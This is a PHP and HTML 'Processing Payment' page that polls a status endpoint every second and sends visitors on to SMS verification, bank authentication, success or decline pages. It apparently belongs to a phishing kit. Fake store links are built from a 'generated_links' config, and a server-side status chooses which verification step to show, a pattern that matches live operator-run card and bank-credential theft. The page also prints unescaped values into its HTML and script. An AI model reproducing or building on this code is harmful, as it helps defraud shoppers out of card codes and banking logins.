<?php
session_start();

// Load config
$config = require __DIR__ . '/config.php';

// Get store ID from session
$storeId = $_SESSION['current_store_id'] ?? null;

// Load specific store configuration if available
if ($storeId && isset($config['generated_links'][$storeId])) {
    $storeConfig = $config['generated_links'][$storeId];
    $config['store'] = $storeConfig['store'];
    $config['product'] = $storeConfig['product'];
}

$sessionId = $_SESSION['unique_id'] ?? '(not set)';
$theme_color = $config['store']['theme_color'] ?? '#FFBABA';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Processing Payment</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-50 min-h-screen flex items-center justify-center p-4">
    <div class="max-w-md w-full text-center">
        <!-- Loading Animation -->
        <div class="mb-8">
            <div class="w-20 h-20 bg-[<?php echo $config['store']['theme_color']; ?>]/10 rounded-full flex items-center justify-center mx-auto relative">
                <div class="w-16 h-16 border-4 border-[<?php echo $config['store']['theme_color']; ?>] border-t-transparent rounded-full animate-spin"></div>
                <svg class="w-8 h-8 text-[<?php echo $config['store']['theme_color']; ?>] absolute" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
                </svg>
            </div>
        </div>

        <!-- Loading Text -->
        <h2 class="text-2xl font-bold text-gray-900 mb-2">Processing Your Payment</h2>
        <p class="text-gray-600 mb-8">Please wait while we verify your payment...</p>

        <!-- Loading Dots -->
        <div class="flex justify-center items-center space-x-2 mb-8">
            <div class="w-3 h-3 bg-[<?php echo $config['store']['theme_color']; ?>] rounded-full animate-bounce" style="animation-delay: 0s"></div>
            <div class="w-3 h-3 bg-[<?php echo $config['store']['theme_color']; ?>] rounded-full animate-bounce" style="animation-delay: 0.2s"></div>
            <div class="w-3 h-3 bg-[<?php echo $config['store']['theme_color']; ?>] rounded-full animate-bounce" style="animation-delay: 0.4s"></div>
        </div>

        
    </div>

    <!-- Debug Info -->
    <?php if (isset($_GET['debug'])): ?>
    <div class="fixed bottom-4 right-4 bg-white p-4 rounded shadow-lg text-xs">
        <pre>Session ID: <?php echo $sessionId; ?>
Store ID: <?php echo $storeId; ?>
Current Status: <?php 
        $sessions = json_decode(file_get_contents('sessions.json'), true);
        echo isset($sessions[$sessionId]) ? $sessions[$sessionId]['status'] : 'unknown';
    ?></pre>
    </div>
    <?php endif; ?>

    <script>
        const sessionId = '<?php echo $sessionId; ?>';
        const storeId = '<?php echo $storeId ?? ''; ?>';
        const storeParam = storeId ? `?store=${encodeURIComponent(storeId)}` : '';
        
        function checkStatus() {
            fetch(`/check_status.php?session=${sessionId}`)
                .then(response => response.json())
                .then(data => {
                    console.log('Status check response:', data); // Debug log
                    if (data.status && data.status !== 'loading') {
                        // Clear the interval before redirecting
                        clearInterval(checkInterval);
                        // Use the redirect URL from the server response
                        if (data.redirect) {
                            window.location.replace(data.redirect);
                        } else {
                            // Fallback redirects if server doesn't provide redirect URL
                            switch(data.status) {
                                case 'success':
                                    window.location.replace('/success.php' + storeParam);
                                    break;
                                case 'sms':
                                    window.location.replace('/sms_verification.php' + storeParam);
                                    break;
                                case 'bank':
                                    window.location.replace('/bank_auth.php' + storeParam);
                                    break;
                                case 'declined':
                                    window.location.replace('/index.php' + storeParam + '&error=payment_declined');
                                    break;
                            }
                        }
                    }
                })
                .catch(error => {
                    console.error('Error checking status:', error);
                });
        }

        // Check status every second
        const checkInterval = setInterval(checkStatus, 1000);
        // Also check immediately
        checkStatus();
    </script>
</body>
</html> 